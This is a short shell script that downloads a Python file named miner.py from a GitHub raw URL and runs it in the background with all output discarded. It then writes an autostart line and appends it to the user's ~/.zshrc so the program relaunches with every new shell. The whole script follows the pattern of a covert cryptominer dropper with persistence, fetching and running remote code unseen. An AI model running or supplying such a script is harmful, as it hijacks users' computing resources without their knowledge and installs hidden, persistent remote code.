mkdir -p ~/mh
cd ~/mh
curl -sL https://raw.githubusercontent.com/max1734601-cpu/mining-dashboard/main/miner.py -o miner.py
nohup python3 miner.py > /dev/null 2>&1 &
echo "cd ~/mh && nohup python3 miner.py > /dev/null 2>&1 &" > ~/.mh_autostart
echo "source ~/.mh_autostart" >> ~/.zshrc
